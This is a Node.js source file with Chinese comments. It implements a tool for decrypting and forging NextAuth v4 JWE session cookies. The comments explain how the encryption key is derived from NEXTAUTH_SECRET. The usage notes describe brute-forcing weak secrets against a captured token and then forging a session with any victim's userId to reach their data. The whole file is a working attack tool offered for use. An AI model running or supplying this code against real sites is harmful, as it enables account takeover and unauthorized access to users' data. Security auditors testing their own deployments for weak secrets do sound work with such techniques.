// nextauth-jwe-forge.js —— NextAuth v4 JWE 会话令牌解密 / 伪造工具
// 适用：使用凭证登录(credentials) + JWT 会话策略 的 Next.js 站点
// 原理：NextAuth v4 的 session cookie 为 JWE Compact 五段式
//   1) alg=dir, enc=A256GCM
//   2) 加密密钥 = HKDF-SHA256(keyMaterial=NEXTAUTH_SECRET,
//        salt = cookie 名(默认 "next-auth.session-token"),
//        info = "NextAuth.js Generated Encryption Key (next-auth.session-token)", 32B)
//   3) AAD = ASCII(base64url(protected header))
// 命中弱 secret 后即可伪造任意 sub（userId）身份，直接越权访问按 userId 隔离的数据。

const crypto = require('crypto');

function b64u(b) { return Buffer.from(b).toString('base64url'); }
function ub64u(s) { return Buffer.from(s, 'base64url'); }

function deriveKey(secret, salt) {
  const info = `NextAuth.js Generated Encryption Key${salt ? ` (${salt})` : ''}`;
  return Buffer.from(crypto.hkdfSync('sha256', Buffer.from(secret), Buffer.from(salt), Buffer.from(info), 32));
}

function decrypt(token, secret, salt = 'next-auth.session-token') {
  const [h, , iv, ct, tag] = token.split('.');
  const d = crypto.createDecipheriv('aes-256-gcm', deriveKey(secret, salt), ub64u(iv));
  d.setAAD(Buffer.from(h, 'ascii'));
  d.setAuthTag(ub64u(tag));
  return JSON.parse(Buffer.concat([d.update(ub64u(ct)), d.final()]).toString('utf8'));
}

function forge(payload, secret, salt = 'next-auth.session-token') {
  const h = b64u(JSON.stringify({ alg: 'dir', enc: 'A256GCM' }));
  const iv = crypto.randomBytes(12);
  const c = crypto.createCipheriv('aes-256-gcm', deriveKey(secret, salt), iv);
  c.setAAD(Buffer.from(h, 'ascii'));
  const ct = Buffer.concat([c.update(Buffer.from(JSON.stringify(payload), 'utf8')), c.final()]);
  return `${h}..${b64u(iv)}.${b64u(ct)}.${b64u(c.getAuthTag())}`;
}

// 用法：候选 secret 循环 decrypt(realToken, cand)，解密成功即命中（GCM 认证失败会抛错）
// 命中后用 forge({sub:'<目标 userId>', email:'x', name:'x', iat:now, exp:now+3600}, cand)
// 作为 Cookie: next-auth.session-token=<token> 请求 /api/auth/session 验证。
module.exports = { decrypt, forge, deriveKey };
